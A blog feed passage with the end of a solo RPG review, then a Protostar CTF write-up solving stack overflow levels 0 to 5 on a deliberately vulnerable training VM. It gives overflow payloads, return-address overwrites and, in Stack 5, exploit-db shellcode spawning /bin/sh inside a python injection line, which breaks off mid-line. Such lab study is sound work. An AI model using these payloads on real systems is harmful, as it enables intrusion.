      <li><em>I can do the bottle uncorking sound with my mouth,</em></li>
      <li><em>I can heel-tap while jumping</em></li>
      <li><em>and I prepare fantastic margaritas</em></li>
    </ul>
  </li>
  <li>What do you have on you? <em>A deck of playing cards</em></li>
  <li>What’s the deal? <em>Maverik is looking for Donald Duck in Asgard</em></li>
  <li>What is the job? <em>Make sure Loki is not masquerading as Donald Duck</em></li>
  <li>What stands in your way?
    <ul>
      <li><em>Tricky terrain: the Bifrost flickers</em></li>
      <li><em>Adverse weather: strong winds make it hard to fly</em></li>
      <li><em>Inanimate objects: the 313 has a flat tire</em></li>
    </ul>
  </li>
</ul>

<h3 id="lets-roll">Let’s roll</h3>
<p>Dave cannot be hurt, but if he can’t complete the job in 19 time units, he will be stuck in the alternate universe forever. So here is our counter: <br />
◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>First of all, can we make it to Asgard? If the Bifrost flickers at rythm, we may try to use our jumping skill to get through. <br />
<strong>Dave: 12+3 ; Event: 14</strong> → We make it, but damn we are out of breath. For sure we cannot serach for Maverik by singing “Lost That Lovin’ Feelin’” <br />
⬤ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>Ok, does Asgard have beach volley fields? We can go look there for Maverik. <br />
<strong>Dave: 16 ; Event: 15</strong> → Judging by the amount of goddesses, he must be there for sure. Now we just have to make it through them to reach him. <br />
⬤ ⬤ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>It’s hard to walk through such a wall of divine hormones… Can we distract them making margaritas? <br />
<strong>Dave: 12+3 ; Event: 5</strong> → Oh yeah baby, these gods love a good cocktail! And now that we have Maverik, on to look for Donald Duck <br />
⬤ ⬤ ⬤ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>Where could we find Donald Duck? Let’s start asking around, maybe somebody has seen him. <br />
<strong>Dave: 13 ; Event: 16</strong> → Nobody has seen him, too bad. We need a new idea. <br />
⬤ ⬤ ⬤ ⬤ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>After all, he is a duck… We might as well try at the pond. <br />
<strong>Dave: 9 ; Event: 12</strong> Uh not looking good… Let’s reroll for Dave and hope a bit of luck <br />
<strong>Dave: 9 ; Event: 12</strong> → Donald Duck is really nowhere to be found. We need a more ridiculous approach. <br />
⬤ ⬤ ⬤ ⬤ ⬤ ◐ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>We could try to lure him in if he is searching for luck. Let’s organize a poker tournment. <br />
<strong>Dave: 14+3 ; Event: 12</strong> → Ah, he couldn’t resist the opportunity to win some money. Let’s not wait until his bad luck kicks in, we move on<br />
⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ◐ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>Let’s not forget to make sure this is not Loki. Maybe if it is him and I make him drunk, he will drop the illusion. <br />
<strong>Dave: 12+3 ; Event: 6</strong> → The margaritas work their magic, and Donald Duck is cartoonishly drunk but seems to be him. Great! <br />
⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ◐ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>Of course Donald Duck came with the 313, but before we can leave with it we need to fix the flat tire. Can we find some chewing gum to do that? <br />
<strong>Dave: 12 ; Event: 7</strong> → Yes! Stick it in place and let’s go direction Bifrost! <br />
⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ◐ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>The Bifrost is still flickering, does the 313 have enough speed to make it? <br />
<strong>Dave: 14 ; Event: 5</strong> → This car is impressive, we give some throttle and it speeds through no problem! We made it back home, congrats! <br />
⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ⬤ ◐ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯ ◯</p>

<p>What a ride. But wait, what is that in your pocket? <br />
Completing the job in 9.5 rounds awards us some common loot… I guess Dave now has a <strong>poker chip</strong>!</p>

<h1 id="review">Review</h1>
<p>Oh-so-simple! And straightforward, no need to look up tables or search for stats. You can make the adventure advance at slow pace or in big steps, and you can change it along the way… nothing prevents you!</p>

<p>The only point that left me confused was during the setup: how do I come up with the “deal” and with the “job”? Is the second a complication for the first? Is the first just supposed to be the wordbuilding step and the task should be handle in the second? I don’t know… but this didn’t prevent me from having fun with this!</p>]]></content><author><name>P2</name></author><category term="RPG" /><summary type="html"><![CDATA[Game by Alfred Valley @ https://alfredvalley.itch.io/dave-ex-machina You are Dave. You are a somewhat average human person whose interests include eating pizza, watching TV and minding your own business. Life would be fine and dandy if it wasn’t for one small thing… Every so often someone somewhere in an alternative dimension performs a summoning ritual but, due to some arcane typo, instead of a demon they get you, Dave. Such a simple premise. Well, let’s see how it goes!]]></summary></entry><entry><title type="html">Protostar CTF</title><link href="http://localhost:4000/ctf/2023/11/06/Protostar.html" rel="alternate" type="text/html" title="Protostar CTF" /><published>2023-11-06T00:00:00+01:00</published><updated>2023-11-06T00:00:00+01:00</updated><id>http://localhost:4000/ctf/2023/11/06/Protostar</id><content type="html" xml:base="http://localhost:4000/ctf/2023/11/06/Protostar.html"><![CDATA[<p><img src="https://cdn.pixabay.com/photo/2011/12/14/12/17/galaxy-11098_1280.jpg" alt="center-aligned-image" class="align-center" /></p>

<p class="notice--info">CTF by <strong>Andrew Griffiths</strong> @ <a href="https://exploit.education/protostar/">https://exploit.education/protostar/</a></p>

<p>This Capture the Flag introduces system internals concepts like sockets and networking, stack and heap overflows, format strings and byte ordering.
I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.</p>

<!--more-->

<table>
  <thead>
    <tr>
      <th>Content:</th>
      <th> </th>
      <th> </th>
      <th> </th>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="#install">Install</a></td>
      <td><a href="#stack-00">Stack 0</a></td>
      <td><a href="#format-00">Format 0</a></td>
      <td><a href="#heap-00">Heap 0</a></td>
      <td><a href="#net-00">Net 0</a></td>
      <td><a href="#final-00">Final 0</a></td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#stack-01">Stack 1</a></td>
      <td><a href="#format-01">Format 1</a></td>
      <td><a href="#heap-01">Heap 1</a></td>
      <td><a href="#net-01">Net 1</a></td>
      <td><a href="#final-01">Final 1</a></td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#stack-02">Stack 2</a></td>
      <td><a href="#format-02">Format 2</a></td>
      <td><a href="#heap-02">Heap 2</a></td>
      <td><a href="#net-02">Net 2</a></td>
      <td><a href="#final-02">Final 2</a></td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#stack-03">Stack 3</a></td>
      <td><a href="#format-03">Format 3</a></td>
      <td><a href="#heap-03">Heap 3</a></td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#stack-04">Stack 4</a></td>
      <td><a href="#format-04">Format 4</a></td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#stack-05">Stack 5</a></td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#stack-06">Stack 6</a></td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#stack-07">Stack 7</a></td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h1 id="capture-the-flag">Capture the Flag</h1>

<h3 id="install">[Install]</h3>
<p>The CTF is downloadable as ISO image, and needs to be mounted. <br />
To mount it use VirtualBox (or VMware or similar) and create a Debian 32bits machine, then pass the iso as bootable media. <br />
For each level, access the machine with the username “user” and the password “user”.
To access, retrieve the IP of the CTF machine, for example with the <code class="language-plaintext highlighter-rouge">ip a</code> command.
Then connect to the machine with SSH, using the credentials and the command ssh user@[ipaddr]. <br />
All the challenges are stored in <code class="language-plaintext highlighter-rouge">/opt/protostar/bin/</code>. <br />
If you want to install anything in the VM, you can login with the <code class="language-plaintext highlighter-rouge">godmode:godmode</code> credentials. <br />
<em>Protostar is little endian, this is important to keep in mind when playing with direct memory access</em></p>

<h3 id="stack-00">[Stack 00]</h3>
<p>Memory can be accessed outside of its allocated region.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

    <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you have changed the 'modified' variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Try again?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Buffer overflow: this bug happens when a program, while writing data to a buffer, overruns the buffer’s boundary and overwrites adjacent memory locations. Buffer overflows can often be triggered by assuming all the inputs are smaller than a certain size and allocating just that size for the buffer: in case an input happens to be larger, it will be written past the end of the buffer.</p>
</blockquote>

<ol>
  <li>The program declares an integer variable and a buffer of static length 64 bytes. This means that memory will look as follows (remember, protostar is little endian): <code class="language-plaintext highlighter-rouge">modified ; modified ; modified ; buffer[63] ; buffer[62] ; ... ; buffer[1] ; buffer[0]</code></li>
  <li>The goal is to overwrite the “modified” variable, meaning that we have to write out of the boundaries of the buffer. Luckily there are no boundary checks in place.</li>
  <li>The only thing we have to do is to start ``./stack0` and give it an input string longer than 64 chars. The additional chars will spill out of the buffer and overwrite the memory cell of the “modified” variable.</li>
</ol>

<h3 id="stack-01">[Stack 01]</h3>
<p>Modify variables to specific values.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"please specify an argument</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>ASCII: this is a character encoding standard: it encodes 128 specified characters into seven-bit integers as shown by the ASCII chart (you can see it in a terminal by tayping man ascii). Ninety-five of the encoded characters are printable: these include the digits 0 to 9, lowercase letters a to z, uppercase letters A to Z, and punctuation symbols.</p>
</blockquote>

<ol>
  <li>What the program does is basically the same as in stack0. The main difference is that we have to pass the string as a parameter when we start ./stack1, instead of the program itself reading it from standard input.</li>
  <li>Instead of overwriting the variable with no matter what, we have to make the value correspond with the expected check: 0x61626364. We can’t write the numbers directly, as every number will be interpreted as a char and therefore not correspond. However, taking a look at the ASCII table we see that the values correspond to a, b, c and d.</li>
  <li>Remembering that the system is little endian, it means that the string has to be passed as “dcba”. As in the previous level, whatever are the first 64 characters does not matter. We can therefore do the following: <code class="language-plaintext highlighter-rouge">./stack1 1111111111111111111111111111111111111111111111111111111111111111dcba</code></li>
</ol>

<h3 id="stack-02">[Stack 02]</h3>
<p>Look at environment variables, and how they can be set.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">variable</span><span class="p">;</span>

    <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"GREENIE"</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you have correctly modified the variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Environment Variable: it’ss a dynamic-named value that can affect the way a processes will behave on a computer. These variables are part of the environment in which a process runs, and they can be queried to find out paths to specific files or directories.</p>
</blockquote>

<ol>
  <li>Exactly as in the previous levels, we have to fill the buffer and then add some to overwrite the desired memory. However in this case the string is not taken as parameter nor from the standard input: it is instead read directly from an environment variable.</li>
  <li>To assign a value to an environment variable it is enough to run <code class="language-plaintext highlighter-rouge">export VARNAME=xxxx</code>. However, we can not reutilize the string we passed the last time because in this case the expected string is made of special characters. If we look in the ASCII table they correspond to the new line and carriage return, and we can not represent them in a single char in our string.</li>
  <li>To go around the problem we can try to set the variable using python, which allows to print the raw byte values:
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="n">export</span> <span class="n">GREENIE</span><span class="o">=</span><span class="sb">`python -c "print '1' * 64 + '\x0a\x0d\x0a\x0d'"`</span>
</code></pre></div>    </div>
  </li>
  <li>However, if we run this line the terminal will complain about a bad variable name, and only store the part with 1s.</li>
  <li>Therefore, we have to set the variable directly when launching the program. This is possible by giving the variable name and its value in before the usual program launch command, all in the same line:
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="n">GREENIE</span><span class="o">=</span><span class="sb">`python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'"`</span> <span class="p">.</span><span class="o">/</span><span class="n">stack2</span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="stack-03">[Stack 03]</h3>
<p>Overwrite function pointers stored on the stack.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">win</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"code flow successfully changed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

    <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
        <span class="n">fp</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>objdump: this command displays information about an object file. It has many parameters that change what is shown: among other possibilities you can see the content of the headers and sections, some disassembly, symbol tables, formats and architectures.</p>
</blockquote>

<blockquote>
  <table>
    <tbody>
      <tr>
        <td>: the vertical line is used to pump output from an instruction to the next instruction</td>
      </tr>
    </tbody>
  </table>
</blockquote>

<ol>
  <li>As in the previous challenges, we have to overwrite a variable by overflowing the input buffer. This time the string is read from stdin, but it will again be made of special characters because we have to provide an address.</li>
  <li>
    <p>This address is a pointer to the location of the <code class="language-plaintext highlighter-rouge">win()</code> method. So the first thing to do is to find out where that method is:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     objdump <span class="nt">-t</span> stack3 | <span class="nb">grep </span>win <span class="c"># use grep to get only relevant output</span>
</code></pre></div>    </div>
  </li>
  <li>This shows that the function is at address 0x08048424. Remembering that the system is little endian, it means that we will have to pass it as a string of form \x24\x84\x04\x08.</li>
  <li>As in the previous challenge, we have to use a workaround to get the special characters properly. We don’t have to write any variable, so we can do directly <code class="language-plaintext highlighter-rouge">python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3.</code></li>
</ol>

<h3 id="stack-04">[Stack 04]</h3>
<p>Overwrit saved EIP and standard buffer overflows.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">win</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"code flow successfully changed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>EIP: it’s a 32 bit register, also called the instruction pointer because Instruction it holds the next instruction address. Based on usual calling conventions, the call instruction pushes the current $eip onto the stack before jumping to the memory address of the called function by setting $eip to that address. The ret instruction at the end of the function will pop the old $eip value, located at that moment on the stack at $ebp + 4, and restore it to continue the execution.</p>
</blockquote>

<ol>
  <li>This challenge is slightly different from the previous ones, because we don’t have a variable to overwrite. Instead we have to overwrite a register, which is not immediately after the memory allocated for the buffer.</li>
  <li>To find out what the address of <code class="language-plaintext highlighter-rouge">$eip</code> is we can use gdb and ask for <code class="language-plaintext highlighter-rouge">info reg</code>. This tells us that <code class="language-plaintext highlighter-rouge">$eip</code> is at address 0x8048411</li>
  <li>What we have to find out now is how far the <code class="language-plaintext highlighter-rouge">$eip</code> location is from our buffer, so that we can calculate how many chars we have to pass to overwrite the right location. We could look at the address of the buffer itself, with for example IDA Pro or GDB and a little work to calculate the locations. Or we could use a tool like <em>Buffer Overflow EIP Offset String Generator</em>, which will generate a unique string that we feed to the program, and by giving back the content of $eip to the service it will tell us the offset between the start of the string (in our case corresponding to the address of the buffer) and the start of the $eip content (corresponding to the address of $eip).</li>
  <li>We start the program in gdb and let it run. When the input is needed, we paste the string generated by the service mentioned in the previous step. When we hit enter, the program will end up in a segmentation fault because it is trying to access an address that does not exist. That’s the moment to check our register with <code class="language-plaintext highlighter-rouge">x/w $eip</code>, and see what is the content (which by the way corresponds to the address that caused the segmentation fault). We copy it back to the service, which tells us that the offset we are looking for is 76.</li>
  <li>Now that we know how long our non-relevant string has to be, we can retrieve the relevant part: the address of the <code class="language-plaintext highlighter-rouge">win()</code> method. We use objdump again, and we obtain the address 0x080483f4.</li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>Exactly as the previous challenge, we can trigger the overflow and redirect the execution to the <code class="language-plaintext highlighter-rouge">win()</code><code class="language-plaintext highlighter-rouge"> method with </code>python -c “print ‘A’ * 76 + ‘\xF4\x83\x04\x08’”</td>
          <td>./stack4`</td>
        </tr>
      </tbody>
    </table>
  </li>
</ol>

<h3 id="stack-05">[Stack 05]</h3>
<p>Standard buffer overflow, introducing shellcode.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Shellcode: this is a small piece of self-contained code used as payload in the exploitation of a software vulnerability. It is called “shellcode” because it typically starts a command shell from which the attacker can control the compromised machine, but it can actually do anything. Shellcodes can be encoded in many different ways, the most simple translates high level instructions to the corresponding assembly and from there to the corresponding opcodes, which are just hex values.</p>
</blockquote>

<ol>
  <li>This challenge starts exactly the same as the previous one: our goal is to overwrite <code class="language-plaintext highlighter-rouge">$eip</code> with the address of our own code. To know how much input we have to give to reach $eip and overwriting it properly we can do exactly the same steps as previous: take the input from the website, execute the program in gdb, pass the input and when it crashes give it back to the website. The result is that once again we need 76 bytes to reach $eip, and that $eip is at address 0x8048411</li>
  <li>
    <p>However this time we don’t have a pre-written function to redirect our flow to. The goal is to use our own shellcode (well, not necessarily written by us, but passed to the program by us), and the only way to inject it in the program is to put it as our input for the buffer. We will use this shellcode from exploit-db:</p>

    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cm">/* The asm instructions correspond t:
     * close(0) 
     * open("/dev/tty", O_RDWR | ...)
     * execve("/bin/sh", ["/bin/sh"], NULL)
 */</span>
        
 <span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span> <span class="o">=</span> 
 <span class="s">"</span><span class="se">\x31\xc0\x31\xdb\xb0\x06\xcd\x80</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x53\x68</span><span class="s">/tty</span><span class="se">\x68</span><span class="s">/dev</span><span class="se">\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x31\xc0\x50\x68</span><span class="s">//sh</span><span class="se">\x68</span><span class="s">/bin</span><span class="se">\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>
</code></pre></div>    </div>
  </li>
  <li>Now we have our input made by the shellcode and the padding (meaning a bunch of \x00 bytes) we need to reach $eip. But we do not know yet what we have to write in $eip: we will have to pass the starting address of the buffer, where the program will find the start of the shellcode.</li>
  <li>
    <p>By disassembling stack5 with <code class="language-plaintext highlighter-rouge">objdump -d</code> we can see that the address of the buffer passed as argument to the gets method is loaded in $eax and is located at $esp+0x10. This means that the address we are looking for corresponds to $esp+0x10, and from gdb we can see that $esp is located at 0xbffffb70.</p>

    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">080483</span><span class="n">c4</span> <span class="n">main</span><span class="o">:</span>
 <span class="mi">80483</span><span class="n">c4</span><span class="o">:</span>   <span class="mi">55</span>                      <span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
 <span class="mi">80483</span><span class="n">c5</span><span class="o">:</span>   <span class="mi">89</span> <span class="n">e5</span>                   <span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
 <span class="mi">80483</span><span class="n">c7</span><span class="o">:</span>   <span class="mi">83</span> <span class="n">e4</span> <span class="n">f0</span>                <span class="n">and</span>    <span class="err">$</span><span class="mh">0xfffffff0</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
 <span class="mi">80483</span><span class="n">ca</span><span class="o">:</span>   <span class="mi">83</span> <span class="n">ec</span> <span class="mi">50</span>                <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x50</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
 <span class="mi">80483</span><span class="n">cd</span><span class="o">:</span>   <span class="mi">8</span><span class="n">d</span> <span class="mi">44</span> <span class="mi">24</span> <span class="mi">10</span>             <span class="n">lea</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
 <span class="mi">80483</span><span class="n">d1</span><span class="o">:</span>   <span class="mi">89</span> <span class="mo">04</span> <span class="mi">24</span>                <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
 <span class="mi">80483</span><span class="n">d4</span><span class="o">:</span>   <span class="n">e8</span> <span class="mi">0</span><span class="n">f</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="mf">80482e8</span> <span class="n">gets</span><span class="err">@</span><span class="n">plt</span>
 <span class="mi">80483</span><span class="n">d9</span><span class="o">:</span>   <span class="n">c9</span>                      <span class="n">leave</span>  
 <span class="mi">80483</span><span class="n">da</span><span class="o">:</span>   <span class="n">c3</span>                      <span class="n">ret</span>  
</code></pre></div>    </div>
  </li>
  <li>The problem is that the actual address of $esp might change on the stack depending on how the program is loaded. So we need another way to access the buffer. What we can see from the disassembly is that the address is loaded in $eax. This means that if we find an instruction like jmp $eax at a static address we could use that address for our new $eip, and the jump will take care of getting us at the right spot.</li>
  <li>To find that gadget we can use a tool like <code class="language-plaintext highlighter-rouge">msfelfscan</code>: by passing the object file and the type of instruction (in our case -j) we are looking for it will return all the addresses where we can find one. Therefore we run <code class="language-plaintext highlighter-rouge">msfelfscan -f stack5 -j eax</code> and see that we can use the instruction <code class="language-plaintext highlighter-rouge">call eax</code> at 0x080483bf for our goal.</li>
  <li>
    <p>Our current payload is made by the shellcode, a padding of 76-len(shellcode) 0-bytes and the address of our call eax instruction.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">68/tty</span><span class="se">\x</span><span class="s2">68/dev</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68//sh</span><span class="se">\x</span><span class="s2">68/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span 